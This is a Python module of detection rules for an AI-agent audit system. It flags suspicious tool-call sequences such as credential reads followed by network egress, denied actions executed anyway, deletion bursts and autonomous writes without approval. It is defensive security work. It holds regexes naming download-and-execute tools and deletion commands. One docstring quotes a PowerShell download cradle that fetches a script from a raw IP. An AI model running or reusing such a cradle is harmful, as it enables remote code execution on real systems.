"""Behavioral sequence rules.

Per-event MITRE tagging (core/audit/mitre.py) says *what* a single tool call is.
These rules say what a *sequence* of calls means — the signal an EDR/CASB can't
see because it never had the agent's intent or the session boundary.

Each rule is a pure function: ``list[event] (time-ordered) -> list[Detection]``.
Add a rule by writing a function and appending it to REGISTRY.
"""

from __future__ import annotations

import re
from datetime import datetime, timezone
from typing import Any

from .models import Detection

# A raw-IP URL and a download/execute verb in the same command is a classic
# malware download cradle. Legit tooling uses domains and package managers.
_RAW_IP_URL = re.compile(r"https?://(?:\d{1,3}\.){3}\d{1,3}")
_DOWNLOAD_EXEC = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
    r"certutil|bitsadmin|invoke-expression|\biex\b",
    re.IGNORECASE,
)
_ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)

# --- safe accessors ----------------------------------------------------------
# Events are plain dicts read from JSONL; never assume a nested key exists.


def _mitre(event: dict[str, Any]) -> dict[str, Any]:
    tool = event.get("tool")
    if isinstance(tool, dict):
        mitre = tool.get("mitre")
        if isinstance(mitre, dict):
            return mitre
    return {}


def _tactic_id(event: dict[str, Any]) -> str:
    return str(_mitre(event).get("tactic_id") or "")


def _technique_id(event: dict[str, Any]) -> str:
    return str(_mitre(event).get("technique_id") or "")


def _actor_type(event: dict[str, Any]) -> str:
    initiator = event.get("initiator")
    return str(initiator.get("actor_type") or "") if isinstance(initiator, dict) else ""


def _action(event: dict[str, Any]) -> dict[str, Any]:
    action = event.get("action")
    return action if isinstance(action, dict) else {}


def _action_type(event: dict[str, Any]) -> str:
    return str(_action(event).get("type") or "")


def _outcome(event: dict[str, Any]) -> str:
    return str(_action(event).get("outcome") or "")


def _tool_qualified(event: dict[str, Any]) -> str:
    tool = event.get("tool")
    return str(tool.get("qualified") or "") if isinstance(tool, dict) else ""


def _command(event: dict[str, Any]) -> str:
    tool = event.get("tool")
    return str(tool.get("command") or "") if isinstance(tool, dict) else ""


def _event_id(event: dict[str, Any]) -> str:
    return str(event.get("event_id") or "")


def _ts(event: dict[str, Any]) -> str:
    return str(event.get("timestamp_utc") or "")


def _correlation_id(events: list[dict[str, Any]]) -> str:
    for event in events:
        cid = event.get("correlation_id")
        if cid:
            return str(cid)
    return ""


def _trigger(event: dict[str, Any]) -> str:
    initiator = event.get("initiator")
    return str(initiator.get("trigger") or "") if isinstance(initiator, dict) else ""


def _norm_tool(name: str) -> str:
    """Same folding core.audit.mitre uses, so `delete_file`/`Delete` agree."""
    return name.lower().replace("_", "").replace("-", "")


def _business_tz(name: str) -> timezone | Any:
    """Resolve the operator's timezone, falling back to UTC if unavailable."""
    if not name or name.upper() == "UTC":
        return timezone.utc
    try:
        from zoneinfo import ZoneInfo

        return ZoneInfo(name)
    except Exception:
        return timezone.utc


def _business_window(spec: str) -> tuple[int, int]:
    """Parse "09-18" into (9, 18). Falls back to 09-18 on anything unparsable."""
    try:
        start_s, end_s = spec.split("-", 1)
        start, end = int(start_s), int(end_s)
        if 0 <= start < end <= 24:
            return start, end
    except (ValueError, AttributeError):
        pass
    return 9, 18


def _to_tz(ts: str, tz: Any) -> datetime | None:
    """Parse a canonical timestamp and convert it into `tz`.

    Explicit conversion is the whole point: reading `.hour` off the parsed value
    reports the *source* offset, not the operator's clock.
    """
    if not ts:
        return None
    try:
        dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except ValueError:
        return None
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)  # canonical events are UTC
    return dt.astimezone(tz)


# --- rules -------------------------------------------------------------------

_DISCOVERY_BURST = 3  # list_dir/glob calls that read as recon before a grab
_DELETE_BURST = 5  # deletions in one session before it is worth a look

# Exact tool methods that destroy data. Normalized via _norm_tool, so
# `delete_file`, `deleteFile` and `Delete` all land here, while
# `remove_whitespace` and `undelete` correctly do not.
_DELETE_METHODS = frozenset(
    {"delete", "deletefile", "removefile", "rm", "rmdir", "unlink", "rmrf", "destroy"}
)

# `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
_DELETE_COMMAND = re.compile(
    r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
)

# Scheduled work runs at night by design; excluded from the off-hours rule.
_SCHEDULED_TRIGGERS = frozenset({"cron", "schedule", "scheduled", "timer"})


def rule_credential_exfil(events: list[dict[str, Any]]) -> list[Detection]:
    """Credential access (T1552) then network egress (TA0011) in one session.

    The read-a-secret-then-phone-home pattern. Critical: this is exfiltration of
    exactly the data a SOC cares about, and no single event looks like an alert.
    """
    cred_idx = next(
        (i for i, e in enumerate(events) if _technique_id(e).startswith("T1552")),
        None,
    )
    if cred_idx is None:
        return []

    for net in events[cred_idx + 1:]:
        if _tactic_id(net) == "TA0011":
            cred = events[cred_idx]
            return [
                Detection(
                    rule_id="credential-exfil",
                    title="Credential access followed by network egress",
                    severity="critical",
                    summary=(
                        f"{_tool_qualified(cred) or 'a tool'} accessed credentials, then "
                        f"{_tool_qualified(net) or 'a tool'} egressed to the network in the "
                        "same session."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0006", "TA0011"],
                    technique_ids=[_technique_id(cred), _technique_id(net)],
                    event_ids=[_event_id(cred), _event_id(net)],
                    first_seen_utc=_ts(cred),
                    last_seen_utc=_ts(net),
                )
            ]
    return []


def rule_autonomous_unapproved_write(events: list[dict[str, Any]]) -> list[Detection]:
    """Autonomous agent performs an Impact action with no human approval first.

    The flagship "no default self-approve" story: an agent running on its own
    (cron/vault_watch/ingress) wrote, edited, or deleted before any human
    approval_response landed in the session. A granted approval resets the gate.
    """
    offending: list[dict[str, Any]] = []
    approved = False
    for event in events:
        if _action_type(event) == "approval_response" and _outcome(event) == "success":
            approved = True
            continue
        if (
            not approved
            and _action_type(event) == "tool_called"
            and _outcome(event) == "success"
            and _tactic_id(event) == "TA0040"
            and _actor_type(event) == "autonomous"
        ):
            offending.append(event)

    if not offending:
        return []

    return [
        Detection(
            rule_id="autonomous-unapproved-write",
            title="Autonomous write without human approval",
            severity="high",
            summary=(
                f"{len(offending)} impact action(s) (write/edit/delete) by an autonomous "
                "agent with no human approval in the session."
            ),
            correlation_id=_correlation_id(events),
            tactic_ids=["TA0040"],
            technique_ids=sorted({_technique_id(e) for e in offending if _technique_id(e)}),
            event_ids=[_event_id(e) for e in offending],
            first_seen_utc=_ts(offending[0]),
            last_seen_utc=_ts(offending[-1]),
        )
    ]


def rule_discovery_then_collect(events: list[dict[str, Any]]) -> list[Detection]:
    """A burst of Discovery (TA0007) then Collection/Credential-Access — recon.

    Enumerating the filesystem and then reading files is the classic recon-then-
    grab shape. Medium: benign on its own, meaningful as a lead-in.
    """
    burst: list[dict[str, Any]] = []
    for event in events:
        tactic = _tactic_id(event)
        if tactic == "TA0007":
            burst.append(event)
        elif tactic in ("TA0009", "TA0006") and len(burst) >= _DISCOVERY_BURST:
            collect = event
            technique_ids = sorted({_technique_id(e) for e in burst if _technique_id(e)})
            if _technique_id(collect):
                technique_ids.append(_technique_id(collect))
            return [
                Detection(
                    rule_id="discovery-then-collect",
                    title="Filesystem recon followed by data collection",
                    severity="medium",
                    summary=(
                        f"{len(burst)} discovery calls preceded {_tool_qualified(collect) or 'a read'} "
                        "collecting data in the same session."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0007", tactic],
                    technique_ids=technique_ids,
                    event_ids=[_event_id(e) for e in burst] + [_event_id(collect)],
                    first_seen_utc=_ts(burst[0]),
                    last_seen_utc=_ts(collect),
                )
            ]
    return []


def rule_approval_denied_then_executed(events: list[dict[str, Any]]) -> list[Detection]:
    """A human denied a gated action, and the exact same action executed successfully later.
    
    Binds the denial event to the subsequent execution event by matching the qualified tool name
    (either tool.qualified or gated_action.tool on the denial, matching tool.qualified on the execution).
    """
    denied_tools: dict[str, dict[str, Any]] = {}
    detections: list[Detection] = []
    
    for event in events:
        action_type = _action_type(event)
        outcome = _outcome(event)
        
        if action_type == "approval_response" and outcome == "denied":
            tool_name = _tool_qualified(event)
            if not tool_name:
                gated = event.get("gated_action")
                if isinstance(gated, dict):
                    tool_name = str(gated.get("tool") or "")
            if tool_name:
                denied_tools[tool_name] = event
                
        elif action_type == "tool_called" and outcome == "success":
            tool_name = _tool_qualified(event)
            if tool_name and tool_name in denied_tools:
                denial = denied_tools[tool_name]
                detections.append(
                    Detection(
                        rule_id="approval-denied-then-executed",
                        title="Denied action was executed",
                        severity="critical",
                        summary=(
                            f"Tool '{tool_name}' was successfully executed after being explicitly "
                            "denied earlier in the session."
                        ),
                        correlation_id=_correlation_id(events),
                        tactic_ids=["TA0005"],
                        technique_ids=[],
                        event_ids=[_event_id(denial), _event_id(event)],
                        first_seen_utc=_ts(denial),
                        last_seen_utc=_ts(event),
                    )
                )
                del denied_tools[tool_name]
                
    return detections


def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detection]:
    """A command pulls a payload from a raw IP, often via an obfuscated one-liner.

    `powershell -EncodedCommand ...` or `IEX (New-Object Net.WebClient).
    DownloadString('http://185.220.101.5/a.ps1')` is a textbook download cradle:
    fetch and execute code from a bare IP address, no domain, no package manager.
    Critical, and it fires on a single event because the command itself is the
    tell.
    """
    for event in events:
        cmd = _command(event)
        if not cmd:
            continue
        if _RAW_IP_URL.search(cmd) and _DOWNLOAD_EXEC.search(cmd):
            encoded = bool(_ENCODED_CMD.search(cmd))
            techniques = ["T1105", "T1059.001"]  # Ingress Tool Transfer, PowerShell
            if encoded:
                techniques.append("T1027")  # Obfuscated Files or Information
            return [
                Detection(
                    rule_id="encoded-command-download",
                    title="Payload download from a raw IP",
                    severity="critical",
                    summary=(
                        f"{_tool_qualified(event) or 'A command'} fetched and executed content "
                        "from a raw IP address"
                        + (" via an encoded command" if encoded else "")
                        + ". A classic download cradle."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0011", "TA0002"],
                    technique_ids=techniques,
                    event_ids=[_event_id(event)],
                    first_seen_utc=_ts(event),
                    last_seen_utc=_ts(event),
                )
            ]
    return []


def _is_delete(event: dict[str, Any]) -> bool:
    """Is this event actually a destruction of data?

    Deliberately NOT a substring test. `"delete" in tool or "remove" in tool`
    matched `editor.remove_whitespace`, `remove_import` and `undelete`, so an
    ordinary refactor produced a *critical* "data destruction attack". Same
    class of bug as the loose tool matching fixed in core/audit/mitre.py.

    Authority order: the ATT&CK technique first (mitre.py already normalizes
    tool spellings), then an exact match on known destructive verbs, then the
    command text, so `bash: rm -rf build/` counts even though the tool is
    "Bash".
    """
    if _technique_id(event) in ("T1485", "T1070.004"):
        return True
    method = _norm_tool(_tool_qualified(event).rsplit(".", 1)[-1])
    if method in _DELETE_METHODS:
        return True
    return bool(_DELETE_COMMAND.search(_command(event)))


def rule_destructive_delete_burst(events: list[dict[str, Any]]) -> list[Detection]:
    """A burst of deletions in one session.

    High rather than critical: an agent cleaning build artifacts looks identical
    to an agent destroying data, and only the operator knows which. Critical is
    reserved for patterns that are hard to explain innocently (credential exfil,
    a denied action running anyway).
    """
    deletes = [
        e
        for e in events
        if _action_type(e) == "tool_called" and _outcome(e) == "success" and _is_delete(e)
    ]
    if len(deletes) < _DELETE_BURST:
        return []
    return [
        Detection(
            rule_id="destructive-delete-burst",
            title="Burst of destructive deletions",
            severity="high",
            summary=(
                f"{len(deletes)} deletion operations in a single session. Worth confirming "
                "this was intended cleanup and not data destruction."
            ),
            correlation_id=_correlation_id(events),
            tactic_ids=["TA0040"],
            technique_ids=sorted({_technique_id(e) for e in deletes if _technique_id(e)}),
            event_ids=[_event_id(e) for e in deletes],
            first_seen_utc=_ts(deletes[0]),
            last_seen_utc=_ts(deletes[-1]),
        )
    ]


def rule_off_hours_activity(events: list[dict[str, Any]]) -> list[Detection]:
    """An autonomous agent performs an impact action outside business hours.

    Opt-in (`AGENTMETRY_DETECT_OFF_HOURS=1`) and off by default, because as a
    generic rule this is mostly noise:

    * Scheduled jobs run at night. That is what cron is for. Flagging a nightly
      archive as "highly suspicious" trains operators to ignore the feed, so
      `trigger: cron` is excluded outright.
    * "Business hours" are local, not UTC. 23:00-05:00 UTC is early evening in
      the US. The window and timezone are therefore operator-configured
      (`AGENTMETRY_BUSINESS_HOURS`, `AGENTMETRY_BUSINESS_TZ`), not assumed.

    Timezone handling matters here: the previous version read `dt.hour` straight
    off the parsed timestamp, so an event stamped `02:00+09:00` (17:00 UTC, a
    Tuesday afternoon) was reported as off-hours "Hour: 2 UTC". Timestamps are
    converted explicitly before comparing.
    """
    from core.config import settings

    if not settings.detect_off_hours:
        return []

    tz = _business_tz(settings.business_tz)
    start_h, end_h = _business_window(settings.business_hours)

    for event in events:
        if _actor_type(event) != "autonomous":
            continue
        # A scheduled job running at 03:00 is doing its job, not hiding.
        if _trigger(event) in _SCHEDULED_TRIGGERS:
            continue
        if _tactic_id(event) != "TA0040" or _outcome(event) != "success":
            continue

        local = _to_tz(_ts(event), tz)
        if local is None:
            continue

        weekend = local.weekday() >= 5
        outside = not (start_h <= local.hour < end_h)
        if not (weekend or outside):
            continue

        when = "the weekend" if weekend else f"{local.hour:02d}:00 local"
        return [
            Detection(
                rule_id="off-hours-activity",
                title="Autonomous impact action outside business hours",
                severity="medium",
                summary=(
                    f"An unscheduled autonomous agent modified or deleted data on {when} "
                    f"({local.tzname()}), outside the configured "
                    f"{start_h:02d}:00-{end_h:02d}:00 window."
                ),
                correlation_id=_correlation_id(events),
                tactic_ids=[_tactic_id(event)],
                technique_ids=[_technique_id(event)] if _technique_id(event) else [],
                event_ids=[_event_id(event)],
                first_seen_utc=_ts(event),
                last_seen_utc=_ts(event),
            )
        ]
    return []


REGISTRY = [
    rule_credential_exfil,
    rule_autonomous_unapproved_write,
    rule_discovery_then_collect,
    rule_approval_denied_then_executed,
    rule_encoded_command_download,
    rule_destructive_delete_burst,
    rule_off_hours_activity,
]
